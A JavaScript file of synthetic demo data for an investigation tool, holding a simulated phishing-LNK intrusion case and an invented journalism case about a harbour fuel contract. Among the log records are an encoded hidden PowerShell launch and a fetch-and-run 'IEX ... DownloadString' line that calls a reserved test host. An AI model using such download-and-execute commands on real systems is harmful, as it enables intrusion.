/* ==========================================================================
   Synthetic demo data. Every address is from a documentation range
   (RFC 5737), every domain is reserved (.example / .test, RFC 2606), every
   person, handle, wallet and hash is invented. Nothing here is real.
   ========================================================================== */
const DEMO = (() => {
const C1 = 'c-lantern', C2 = 'c-story';
const cases = [
  {id:C1, name:'Op Lantern — invoice LNK intrusion', code:'TN-2026-014', status:'active', owner:'You',
   created:'2026-09-14T09:30:00Z', updated:'2026-09-15T11:20:00Z', t0:'r-lnk',
   scope:'Phishing LNK on WS-FIN-07, beaconing implant, lateral movement to DC01. OSINT on the sender infrastructure.'},
  {id:C2, name:'Kestrel Dawn — a port contract and a ship that went dark', code:'ST-2026-007', status:'active', owner:'You', tpl:'story',
   created:'2026-09-18T08:00:00Z', updated:'2026-09-24T17:00:00Z',
   scope:'A tip says the Northmouth harbour fuel contract went to a company set up weeks before the tender closed, part-owned by a councillor\'s brother, whose tanker switched off its transponder near a sanctioned terminal. Check every claim, keep the source safe, and give everyone named a fair chance to reply before publication.'}
];
/* [id, case, type, time, host, source, title, body, tags] */
const R = [
 ['r-mail',C1,'evidence','2026-09-14T08:52:10Z','MX01','mail-gateway','Invoice email delivered to finance',
  'From: billing@lantern-invoice.example  To: j.okafor@corp.example  Subject: Invoice 4471 overdue  Attachment: Invoice_4471.pdf.lnk (1.9 KB)',['initial-access']],
 ['r-lnk',C1,'evidence','2026-09-14T08:57:33Z','WS-FIN-07','sysmon','LNK opened — cmd spawns encoded PowerShell',
  'EventID 1 ParentImage=C:\\Windows\\explorer.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd.exe /c powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" from Invoice_4471.pdf.lnk',['execution']],
 ['r-ps',C1,'evidence','2026-09-14T08:57:35Z','WS-FIN-07','powershell','Script block downloads second stage',
  'EventID 4104 ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(\'http://update-lamp.test/s.ps1\')',['execution']],
 ['r-dns',C1,'evidence','2026-09-14T08:57:41Z','WS-FIN-07','sysmon','DNS: update-lamp.test resolves',
  'EventID 22 QueryName=update-lamp.test QueryResults=198.51.100.23 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',['c2']],
 ['r-drop',C1,'evidence','2026-09-14T08:58:02Z','WS-FIN-07','sysmon','svchost.exe dropped in Public folder',
  'EventID 11 TargetFilename=C:\\Users\\Public\\svchost.exe SHA256=9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a',['payload']],
 ['r-exec',C1,'evidence','2026-09-14T08:58:09Z','WS-FIN-07','sysmon','Fake svchost.exe executes',
  'EventID 1 Image=C:\\Users\\Public\\svchost.exe ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe User=CORP\\j.okafor',['execution']],
 ['r-c2a',C1,'evidence','2026-09-14T08:58:15Z','WS-FIN-07','sysmon','Outbound connection to 203.0.113.47:4444',
  'EventID 3 Image=C:\\Users\\Public\\svchost.exe DestinationIp=203.0.113.47 DestinationPort=4444 -> 203.0.113.47:4444',['c2']],
 ['r-c2b',C1,'evidence','2026-09-14T08:59:16Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51022 -> 203.0.113.47:4444 bytes=412',['c2']],
 ['r-c2c',C1,'evidence','2026-09-14T09:00:14Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51031 -> 203.0.113.47:4444 bytes=398',['c2']],
 ['r-c2d',C1,'evidence','2026-09-14T09:01:17Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51040 -> 203.0.113.47:4444 bytes=405',['c2']],
 ['r-c2e',C1,'evidence','2026-09-14T09:02:15Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51052 -> 203.0.113.47:4444 bytes=6120',['c2']],
 ['r-task',C1,'evidence','2026-09-14T09:05:40Z','WS-FIN-07','security','Scheduled task "OneDriveUpdate" created',
  'EventID 4698 TaskName=\\OneDriveUpdate Command=C:\\Users\\Public\\svchost.exe SubjectUserName=CORP\\j.okafor schtasks.exe',['persistence']],
 ['r-run',C1,'evidence','2026-09-14T09:12:03Z','WS-FIN-07','sysmon','Run key points at the dropped binary',
  'EventID 13 TargetObject=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpd Details=C:\\Users\\Public\\svchost.exe',['persistence']],
 ['r-lat',C1,'evidence','2026-09-14T14:31:22Z','DC01','security','Network logon to DC01 as svc_backup',
  'EventID 4624 LogonType=3 TargetUserName=CORP\\svc_backup IpAddress=10.20.4.17 WorkstationName=WS-FIN-07',['lateral-movement']],
 ['r-priv',C1,'evidence','2026-09-14T14:33:10Z','DC01','security','Special privileges assigned to svc_backup',
  'EventID 4672 SubjectUserName=CORP\\svc_backup Privileges=SeBackupPrivilege SeDebugPrivilege',['privilege']],
 ['r-clear',C1,'evidence','2026-09-14T14:40:55Z','DC01','security','Security log cleared on DC01',
  'EventID 1102 The audit log was cleared. SubjectUserName=CORP\\svc_backup',['anti-forensics']],
 ['r-find1',C1,'finding','2026-09-14T15:10:00Z','','analyst','Implant beacons to 203.0.113.47 roughly every 60 s',
  'Five connections from the dropped svchost.exe to 203.0.113.47:4444, 58–63 s apart. Last one carried 6 KB — likely tasking or exfil. Block at FW-EDGE requested.',['c2']],
 ['r-whois',C1,'evidence','2026-09-15T10:20:00Z','','osint:whois','Sender domain registered 13 days before the email',
  'lantern-invoice.example registered 2026-09-01 via Example Registrar Inc.; registrant email n1ghtlamp@mail.example (privacy proxy not used).',['osint','infrastructure']],
 ['r-forum',C1,'evidence','2026-09-15T10:34:00Z','','osint:forum','Handle @n1ghtlamp sells "lamp loader" on forum.example',
  'Profile of @n1ghtlamp on forum.example (joined 2025-11) advertises a "lamp loader" builder; contact listed as n1ghtlamp@mail.example. Screenshot captured.',['osint','actor']],
 ['r-wallet',C1,'evidence','2026-09-15T10:52:00Z','','osint:forum','Forum post lists a BTC payment address',
  'Pricing post by @n1ghtlamp: payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh only.',['osint','finance']],
 ['r-chain',C1,'note','2026-09-15T11:05:00Z','','osint:explorer','Wallet received 0.42 BTC on Sep 10 (synthetic)',
  'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh — 3 inbound transfers 2026-09-08..10, total 0.42 BTC. Not yet attributed.',['osint','finance']],
 ['q1',C1,'lead',null,'','checklist','What was the initial access vector?','',['question']],
 ['q2',C1,'lead',null,'','checklist','Which account moved laterally to DC01?','',['question']],
 ['q3',C1,'lead',null,'','checklist','Does 198.51.100.23 host other domains?','Passive DNS needed — offline lookup file or analyst note.',['question']],
 ['q4',C1,'lead',null,'','checklist','Who operates @n1ghtlamp?','',['question']],
 ['q5',C1,'lead',null,'','checklist','Was anything exfiltrated in the 6 KB beacon?','',['question']],
 ['r-scope',C1,'note',null,'','analyst','Scope so far: WS-FIN-07 and DC01','Finance team notified 2026-09-14 10:05. WS-FIN-07 isolated 10:40. DC01 pending image.',['scope']],
 // case 2 — journalism: a contract, a family link and a tanker that went dark
 ['s-tip',C2,'note','2026-09-18T08:10:00Z','','tip','Tip received through the secure drop',
  'A council employee says the Northmouth harbour fuel contract (about EUR 4.2m a year) went to Grey Gull Marine Ltd, registered only weeks before the tender closed, and that the company\'s tanker "goes dark" near Port Varan. Who the tipster is stays in Protected sources, never here.',['tip']],
 ['s-reg',C2,'evidence','2026-09-18T10:30:00Z','','company registry','Registry extract — Grey Gull Marine Ltd',
  'Grey Gull Marine Ltd, company no. 14552019, incorporated 2026-06-02. Registered office: 4 Quay Lane, Northmouth. Director: Mara Velden (appointed 2026-06-02). Website https://greygull-marine.example — press contact press@greygull-marine.example',['company','registry']],
 ['s-tender',C2,'evidence','2026-09-18T11:05:00Z','','council minutes','Harbour Board minutes — fuel contract awarded without competition',
  'Northmouth Harbour Board, 2026-07-14, item 6: the fuel supply contract is awarded to Grey Gull Marine Ltd under a single-tender procedure, "for reasons of urgency". Proposed by councillor Peter Lund, seconded, carried 5–2. The tender window closed 2026-06-20.',['contract']],
 ['s-whois',C2,'evidence','2026-09-18T13:40:00Z','','osint:whois','WHOIS — greygull-marine.example registered before the company',
  'greygull-marine.example registered 2026-05-29 via Example Registrar Inc. Registrant organisation: Velden Consulting. Registrant email m.velden@mail.example. Name servers ns1.example-host.test',['osint','infrastructure']],
 ['s-ais1',C2,'evidence','2026-08-03T21:14:00Z','','ais:export','AIS — Kestrel Dawn stops transmitting',
  'MMSI 636019825, IMO 9074729, KESTREL DAWN (tanker, 183 m). Last message 2026-08-03 21:14 UTC at 57.412, 4.318 heading 078 at 11.2 kn, draught 6.1 m. Nothing received for the next 52 hours.',['vessel','ais']],
 ['s-sat',C2,'evidence','2026-08-04T10:20:00Z','','satellite','Satellite image: a tanker of the same length at the Port Varan terminal',
  'Commercial satellite image, 2026-08-04 10:20 UTC: a tanker about 183 m long moored at the Port Varan oil terminal (57.903, 5.087). The hull markings cannot be read: a likely match, not a certain one.',['vessel','imagery']],
 ['s-ais2',C2,'evidence','2026-08-06T01:40:00Z','','ais:export','AIS — Kestrel Dawn reappears, now low in the water',
  'MMSI 636019825 transmits again 2026-08-06 01:40 UTC at 57.884, 5.112, draught 11.8 m (6.1 m before the gap). The ship most likely took on cargo while it was dark.',['vessel','ais']],
 ['s-social',C2,'evidence','2026-07-15T18:02:00Z','','osint:social','The director thanks the councillor the day after the vote',
  '@maravelden on social.example: "Proud that Grey Gull will keep Northmouth moving! Thanks to @peterlund for backing local business." https://social.example/@maravelden/112339',['osint','social']],
 ['s-about1',C2,'evidence','2026-07-01T09:00:00Z','','web archive','Company website, July: Lund Shipping Services listed as a partner',
  'Archived copy of https://greygull-marine.example/about (2026-07-01): "Our partners: Lund Shipping Services, Northmouth Bunkering."',['web','archived']],
 ['s-about2',C2,'evidence','2026-09-21T09:30:00Z','','web','Company website, September: the partner is gone',
  'Live page https://greygull-marine.example/about (2026-09-21): "Our partners: Northmouth Bunkering." Lund Shipping Services no longer appears. Changed some time after 2026-07-01.',['web','changed']],
 ['s-family',C2,'evidence','2026-09-22T11:00:00Z','','company registry','Registry filing: the councillor\'s brother owns 40%',
  'Return of allotment, 2026-06-09: 40 of 100 shares in Grey Gull Marine Ltd allotted to Henrik Lund, 22 Harbour Row, Northmouth. Henrik Lund is named as the brother of councillor Peter Lund in the council\'s 2024 register of interests.',['company','conflict-of-interest']],
 ['s-interests',C2,'evidence','2026-09-22T11:20:00Z','','register of interests','The councillor\'s 2026 declaration does not mention it',
  'Peter Lund\'s declaration of interests, filed 2026-05-30, lists no interest in Grey Gull Marine Ltd and no shareholding by a family member. Declarations must be updated within 28 days of a change.',['conflict-of-interest']],
 ['s-statement',C2,'evidence','2026-09-24T15:30:00Z','','right of reply','Grey Gull Marine: "a technical fault"',
  'Email from Mara Velden, 2026-09-24: "Grey Gull Marine complies with all applicable sanctions. Our vessel\'s transponder suffered a technical fault in early August, which was reported to the flag state. We have never called at Port Varan."',['reply']],
 ['s-find',C2,'finding','2026-09-24T16:00:00Z','','analyst','What we can stand up so far',
  'Confirmed: the company\'s age, the single-tender award, the 40% family shareholding, the 52-hour AIS gap. Likely but not proven: that the tanker at Port Varan is Kestrel Dawn. Not established: that the councillor influenced the award. Waiting on the councillor\'s reply.',['finding']],
 ['sq1',C2,'lead',null,'','checklist','Did councillor Lund declare the family shareholding anywhere else?','',['question']],
 ['sq2',C2,'lead',null,'','checklist','Can the flag state confirm a reported transponder fault?','',['question']],
 ['sq3',C2,'lead',null,'','checklist','Why was it a single tender, and who else could have bid?','',['question']],
 ['sq4',C2,'lead',null,'','checklist','Is the tanker at Port Varan Kestrel Dawn — a second image, or port call records?','',['question']],
];
const answers = {sq3:'Minutes say "urgency" after the previous supplier\'s contract lapsed; two local suppliers say they were never asked.', q1:'Phishing LNK attachment — Invoice_4471.pdf.lnk', q2:'CORP\\svc_backup'};
const verdicts = {
  'ipv4:203.0.113.47':'malicious','hostport:203.0.113.47:4444':'malicious','domain:update-lamp.test':'malicious',
  'domain:lantern-invoice.example':'malicious','url:http://update-lamp.test/s.ps1':'malicious',
  'sha256:9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a':'malicious',
  'path:C:\\Users\\Public\\svchost.exe':'suspicious','handle:@n1ghtlamp':'suspicious','email:n1ghtlamp@mail.example':'suspicious',
  'ipv4:198.51.100.23':'suspicious','account:CORP\\svc_backup':'suspicious',
  'ipv4:10.20.4.17':'benign','email:j.okafor@corp.example':'benign','domain:corp.example':'benign','file:explorer.exe':'benign'
};
/* Dossier-style attributes: each carries its source record and a confidence 1–3 */
const attrs = {
  'domain:lantern-invoice.example':[['Registered','2026-09-01','r-whois',3],['Registrar','Example Registrar Inc.','r-whois',3],['Registrant email','n1ghtlamp@mail.example','r-whois',2]],
  'handle:@n1ghtlamp':[['Platform','forum.example','r-forum',3],['Joined','2025-11','r-forum',2],['Offers','"lamp loader" builder','r-forum',2],['Contact','n1ghtlamp@mail.example','r-forum',3]],
  'btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh':[['Inbound','0.42 BTC across 3 transfers','r-chain',2],['Advertised by','@n1ghtlamp','r-wallet',2]],
  'ipv4:203.0.113.47':[['Port','4444/tcp','r-c2a',3],['Role','C2 for fake svchost.exe','r-find1',3]],
  'domain:update-lamp.test':[['Resolves to','198.51.100.23','r-dns',3],['Serves','/s.ps1 second stage','r-ps',3]]
};
/* Asserted relationships: an analyst claim with a label, confidence and its evidence */
const edges = [
  ['email:n1ghtlamp@mail.example','domain:lantern-invoice.example','registered',2,'r-whois'],
  ['handle:@n1ghtlamp','email:n1ghtlamp@mail.example','uses email',3,'r-forum'],
  ['handle:@n1ghtlamp','btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','advertises wallet',2,'r-wallet'],
  ['domain:update-lamp.test','ipv4:198.51.100.23','resolves to',3,'r-dns'],
  ['sha256:9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a','ipv4:203.0.113.47','beacons to',3,'r-find1']
];
/* Sample feed items — stand-ins for an imported RSS/OPML file */
const feed = [
  {id:'f1',source:'Sample Intel Weekly',date:'2026-09-15T07:00:00Z',title:'"Lamp loader" builder sold on underground forum, C2 on port 4444',
   body:'Researchers track a commodity loader delivered by invoice-themed LNK files. Observed C2: 203.0.113.47:4444 and update-lamp[.]test.'},
  {id:'f2',source:'Sample CERT Bulletin',date:'2026-09-13T12:00:00Z',title:'Credential-stuffing wave against customer portals',
   body:'Automated login attempts with python-requests user agents from 192.0.2.66 and others.'},
  {id:'f3',source:'Sample Vendor Blog',date:'2026-09-11T09:30:00Z',title:'Patch Tuesday: CVE-2026-21001 in print spooler under active exploitation',
   body:'No indicators published yet.'},
  /* summaries of well-documented public events (real CVEs, advisories and actor names), written for the demo */
  {id:'f4',source:'Sample advisory digest',date:'2024-04-12T15:00:00Z',title:'PAN-OS GlobalProtect zero-day CVE-2024-3400 exploited in the wild',
   body:'Palo Alto Networks disclosed a critical command injection in the GlobalProtect feature of PAN-OS, exploited before a fix was available. Volexity tracked the activity as UTA0218: exploitation of the public-facing firewall (T1190) followed by a Python backdoor and lateral movement. Apply the hotfix and hunt for signs of compromise.'},
  {id:'f5',source:'Sample vendor watch',date:'2024-04-13T09:00:00Z',title:'Attackers exploit CVE-2024-3400 in Palo Alto Networks firewalls; CISA adds it to KEV',
   body:'CISA added the PAN-OS GlobalProtect vulnerability CVE-2024-3400 to the Known Exploited Vulnerabilities catalog. Organisations running affected Palo Alto Networks firewalls should patch and review logs.'},
  {id:'f6',source:'Sample advisory digest',date:'2023-11-21T14:00:00Z',title:'LockBit 3.0 affiliates exploit Citrix Bleed (CVE-2023-4966)',
   body:'A joint CISA and FBI advisory describes LockBit 3.0 ransomware affiliates exploiting Citrix NetScaler ADC and Gateway session token leakage, CVE-2023-4966, to hijack sessions (T1550.004) and deploy ransomware (T1486).'},
  {id:'f7',source:'Sample research notes',date:'2023-06-07T16:00:00Z',title:'CL0P ransomware gang exploits MOVEit Transfer CVE-2023-34362',
   body:'The CL0P ransomware gang mass-exploited a SQL injection in Progress MOVEit Transfer, CVE-2023-34362, installing the LEMURLOOT web shell and stealing data for extortion (T1190, T1505.003).'},
  {id:'f8',source:'Sample advisory digest',date:'2024-02-07T17:00:00Z',title:'Volt Typhoon pre-positions in critical infrastructure networks',
   body:'Agencies warn that Volt Typhoon, a People\'s Republic of China state-sponsored group, compromised IT networks of critical infrastructure. The actor relies on living-off-the-land techniques, valid accounts (T1078) and dumping NTDS.dit with ntdsutil (T1003.003).'},
  {id:'f9',source:'Sample research notes',date:'2024-01-10T18:00:00Z',title:'Ivanti Connect Secure zero-days CVE-2023-46805 and CVE-2024-21887 chained',
   body:'An authentication bypass and a command injection in Ivanti Connect Secure VPN appliances were chained for unauthenticated remote code execution. Exploitation was observed before patches; Ivanti published mitigations.'},
  {id:'f10',source:'Sample vendor watch',date:'2024-02-09T12:00:00Z',title:'Fortinet FortiOS SSL VPN flaw CVE-2024-21762 potentially exploited',
   body:'Fortinet patched a critical out-of-bounds write in FortiOS SSL VPN, CVE-2024-21762, noting it was potentially being exploited in the wild. CISA added it to the KEV catalog.'},
  {id:'f11',source:'Sample advisory digest',date:'2023-11-16T15:00:00Z',title:'Scattered Spider targets IT help desks with social engineering',
   body:'Scattered Spider operators impersonate staff to persuade help desks to reset credentials and enroll new MFA devices, use MFA request flooding (T1621) and phishing (T1566), and have deployed ALPHV ransomware.'},
  {id:'f12',source:'Sample research notes',date:'2023-08-29T19:00:00Z',title:'International operation disrupts QakBot botnet infrastructure',
   body:'Law enforcement disrupted the QakBot malware botnet, used for years as an initial access loader for ransomware groups, and redirected infected computers to an uninstaller.'}
];
const D = t => Date.parse(t);
const story = {
  claims:[
    {id:'sc1', t:'Grey Gull Marine Ltd was set up less than three weeks before the tender closed', st:'confirmed', for:['r:s-reg', 'r:s-tender'], against:[], about:['st-co'], note:'', at:D('2026-09-18T12:00:00Z')},
    {id:'sc2', t:'The contract was awarded without competition', st:'confirmed', for:['r:s-tender'], against:[], about:['st-board', 'st-co'], note:'Minutes give "urgency" as the reason.', at:D('2026-09-18T12:10:00Z')},
    {id:'sc3', t:'The councillor\'s brother owns 40% of the company that won', st:'confirmed', for:['r:s-family', 'r:s-interests'], against:[], about:['st-bro', 'st-cllr', 'st-co'], note:'', at:D('2026-09-22T11:30:00Z')},
    {id:'sc4', t:'The councillor did not declare the family interest', st:'unverified', for:['r:s-interests'], against:[], about:['st-cllr'], note:'Ask whether a later declaration exists (lead sq1).', at:D('2026-09-22T11:40:00Z')},
    {id:'sc5', t:'Kestrel Dawn loaded cargo at Port Varan while its transponder was off', st:'disputed', for:['r:s-ais1', 'r:s-sat', 'r:s-ais2'], against:['r:s-statement'], about:['st-co'], note:'The company says a technical fault; the satellite match is likely, not certain.', at:D('2026-09-24T16:10:00Z')}],
  replies:[
    {id:'sr1', who:'st-co', name:'', via:'Email to Mara Velden, director', at:D('2026-09-22T09:00:00Z'), due:D('2026-09-25T17:00:00Z'), claims:['sc1', 'sc2', 'sc3', 'sc5'], st:'answered', resp:'Grey Gull Marine complies with all applicable sanctions. Our vessel\'s transponder suffered a technical fault in early August, which was reported to the flag state. We have never called at Port Varan.', respAt:D('2026-09-24T15:30:00Z')},
    {id:'sr2', who:'st-cllr', name:'', via:'Email and phone', at:D('2026-09-23T10:00:00Z'), due:D('2026-09-27T12:00:00Z'), claims:['sc2', 'sc3', 'sc4'], st:'waiting', resp:'', respAt:null},
    {id:'sr3', who:'st-board', name:'', via:'Email to the press office', at:D('2026-09-23T10:15:00Z'), due:D('2026-09-27T12:00:00Z'), claims:['sc2'], st:'declined', resp:'The Board does not comment on individual contracts.', respAt:D('2026-09-23T16:40:00Z')},
    {id:'sr4', who:'st-bro', name:'', via:'Letter and phone', at:D('2026-09-23T11:00:00Z'), due:D('2026-09-27T12:00:00Z'), claims:['sc3'], st:'waiting', resp:'', respAt:null}],
  archive:{
    'https://greygull-marine.example':{req:D('2026-09-18T10:35:00Z'), checked:D('2026-09-18T10:40:00Z'), at:D('2026-09-18T10:36:00Z'), snap:'https://web.archive.org/web/20260918103600/https://greygull-marine.example'},
    'https://greygull-marine.example/about':{req:D('2026-09-21T09:35:00Z'), checked:D('2026-09-21T09:40:00Z'), at:D('2026-07-01T09:00:00Z'), snap:'https://web.archive.org/web/20260701090000/https://greygull-marine.example/about'},
    'https://social.example/@maravelden/112339':{req:D('2026-09-21T09:50:00Z'), checked:D('2026-09-21T10:05:00Z'), at:D('2026-09-21T09:55:00Z'), snap:'https://web.archive.org/web/20260921095500/https://social.example/@maravelden/112339'}}
};
return {cases, R, answers, verdicts, attrs, edges, feed, story};
})();
